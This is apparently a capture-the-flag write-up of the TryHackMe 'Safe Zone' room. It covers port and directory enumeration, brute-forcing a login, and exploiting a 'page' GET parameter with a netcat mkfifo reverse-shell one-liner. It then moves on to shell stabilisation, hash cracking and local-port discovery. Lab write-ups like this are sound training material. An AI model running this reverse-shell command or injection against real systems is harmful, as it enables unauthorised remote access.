---
title: Safe Zone
layout: post
author: Bit Criminals Team
date: 2021-05-10 17:02:00 +0530
type: Pen Testing
difficulty: Medium
prompt: https://tryhackme.com/room/safezone
---


This was an interesting and thought-provoking room!

So,let's start!

# Enumeration
 Using nmap I founded 2 open ports : 22 (for ssh) and 80 (for http service)

 Command used: 
> nmap -sS -Pn -T4 -vvv <ip>

![nmap](https://user-images.githubusercontent.com/78094309/117653814-834ba580-b1b2-11eb-82a8-2824c38ebb7b.png)


Now, looking after port 80, I used gobuster and thus got the following directories:
![gobuster](https://user-images.githubusercontent.com/78094309/117653895-a24a3780-b1b2-11eb-8017-20bf507ef83c.png)

On checking index.php, Got a login form:

![loging_page](https://user-images.githubusercontent.com/78094309/117654823-ea1d8e80-b1b3-11eb-9eb7-978b8ba0a6e1.png)


On checking further directories and enumeration i got the hint for the password:
![~files](https://user-images.githubusercontent.com/78094309/117655056-32d54780-b1b4-11eb-99da-771cb0f581c2.png)

So, I made a script and thus found out the password:

![script](https://user-images.githubusercontent.com/78094309/117655127-4bddf880-b1b4-11eb-97c2-072ad49f3ed2.png)

> password: admin44admin

Now,checking the source-code ,a hint was given : use *page* as GET parameter

![webpage-get](https://user-images.githubusercontent.com/78094309/117655350-919ac100-b1b4-11eb-93a0-c857be2f174b.png)


So, I tried opening a shell using the following command (passed as get parameter):

> rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc <ip> <port> >/tmp/f

Using any online URL encoder tool,I encoded this string and passed as GET parameter and thus was able to obtain a shell.
![nc_alternative](https://user-images.githubusercontent.com/78094309/117655622-f0f8d100-b1b4-11eb-99e7-b5a0e492f2b4.png)

Used burp for passing GET request:
![burp](https://user-images.githubusercontent.com/78094309/117655661-ff46ed00-b1b4-11eb-92dc-9f568f0d7595.png)

for reference, you can read the concept here: https://www.hackingarticles.in/apache-log-poisoning-through-lfi/

![shell](https://user-images.githubusercontent.com/78094309/117655795-28677d80-b1b5-11eb-9333-fbe54dcb96f9.png)



After getting the shell lets convert it into a stable tty shell by using following commands:

```py
python3 -c 'import pty; pty.spawn("/bin/bash")'
export TERM=xterm
```
![](safezone1.png)

I searched for the user flag but there were only previous hints that we got. But then we got the password hash for the user files and after cracking it using john we came to know that its password is `magic`
![](safezone2.png)

So now we can login as files through ssh!
After finding a bit i used following command to check if there is possibility for port forwading and YES there were two ports running locally...
```py
ss -tulwn
```
![](safezone3.png)

I tried 3336 port but there was nothing but port 8000 gave us positive response!
![](safezone4.png)

![](safezone5.png)

So we ran gobuster on it and found a index.html directory which was a login page.
![](safezone6.png)

![](safezone7.png)

And its source contained a login.js directory which gave us the creadentials.
So we succesfully loged in....

![](safezone8.png)
